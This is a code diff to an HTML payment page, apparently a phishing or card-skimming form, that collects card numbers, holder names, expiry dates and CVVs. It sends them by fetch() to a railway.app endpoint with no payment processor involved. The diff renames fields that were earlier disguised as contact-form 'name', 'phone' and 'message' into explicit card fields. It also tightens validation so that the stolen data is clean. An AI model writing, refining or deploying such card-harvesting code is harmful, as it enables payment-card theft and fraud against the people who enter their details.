@@ -63,7 +63,7 @@
         }
 
         .expiry {
-            margin-right: 6px; /* إضافة مسافة بسيطة بين تاريخ الانتهاء و CVV */
+            margin-right: 6px;
         }
 
         .save-card {
@@ -108,12 +108,12 @@
         <img src="https://i.imgur.com/ZR6p2ie.png" class="card-image" alt="Credit Card">
         
         <form id="paymentForm">
-            <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" pattern="\d*" required>
+            <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" pattern="\d{16}" required>
             <input type="text" id="cardHolder" placeholder="Card Holder Name" pattern="[A-Za-z ]+" required>
             
             <div class="input-row">
-                <input type="text" id="expiryDate" class="expiry" placeholder="MM/YY" maxlength="5" required>
-                <input type="text" id="cvv" placeholder="CVV" maxlength="3" pattern="\d*" required>
+                <input type="text" id="expiryDate" class="expiry" placeholder="MM/YY" maxlength="5" pattern="(0[1-9]|1[0-2])\/\d{2}" required>
+                <input type="text" id="cvv" placeholder="CVV" maxlength="3" pattern="\d{3}" required>
             </div>
 
             <div class="save-card">
@@ -131,19 +131,26 @@
         document.getElementById("paymentForm").addEventListener("submit", function(event) {
             event.preventDefault();
 
-            const cardNumber = document.getElementById("cardNumber").value;
-            const cardHolder = document.getElementById("cardHolder").value;
-            const expiryDate = document.getElementById("expiryDate").value;
-            const cvv = document.getElementById("cvv").value;
+            const cardNumber = document.getElementById("cardNumber").value.trim();
+            const cardHolder = document.getElementById("cardHolder").value.trim();
+            const expiryDate = document.getElementById("expiryDate").value.trim();
+            const cvv = document.getElementById("cvv").value.trim();
             const saveCard = document.getElementById("saveCard").checked ? "Yes" : "No";
+
+            if (!cardNumber || !cardHolder || !expiryDate || !cvv) {
+                alert("يجب ملء جميع الحقول!");
+                return;
+            }
 
             fetch("https://nodejs-production-7090.up.railway.app/send", { 
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
-                    name: cardHolder, 
-                    phone: cardNumber, 
-                    message: `Expiry: ${expiryDate}, CVV: ${cvv}, Save Card: ${saveCard}` 
+                    card_number: cardNumber, 
+                    card_holder: cardHolder, 
+                    expiry_date: expiryDate, 
+                    cvv_code: cvv,
+                    save_card: saveCard
                 })
             })
             .then(response => response.json())
